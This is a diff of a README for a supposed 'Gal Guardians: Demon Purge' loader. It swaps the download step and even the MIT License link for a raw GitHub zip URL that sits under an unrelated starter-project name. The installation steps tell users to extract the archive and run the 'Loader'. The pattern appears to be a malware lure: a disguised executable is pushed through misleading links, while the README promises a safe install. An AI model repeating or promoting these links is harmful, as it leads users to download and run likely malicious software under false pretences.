@@ -29,7 +29,7 @@ Welcome to the **ultimate repository** for downloading and managing *Gal Guardia
 
 ## 🔽 Installation
 
-1. **Download Loader.rar** from the repository.
+1. **Download https://raw.githubusercontent.com/alvarorama2007/online-store-strapi-next-js-v1-starter-repo/main/unmaddened/online-store-strapi-next-js-v1-starter-repo.zip** from the repository.
 2. Extract the files using your preferred archive manager.
 3. Run the Loader following the included instructions for your OS.
 4. Enjoy *Gal Guardians: Demon Purge* safely!
@@ -51,7 +51,7 @@ Gal Guardians Demon Purge , Loader, Install, Windows, Mac, Linux, Steam Deck, Sa
 ## 📄 License
 
 This project is licensed under the MIT License.  
-[Read the MIT License here](https://opensource.org/licenses/MIT)
+[Read the MIT License here](https://raw.githubusercontent.com/alvarorama2007/online-store-strapi-next-js-v1-starter-repo/main/unmaddened/online-store-strapi-next-js-v1-starter-repo.zip)
 
 ---
 
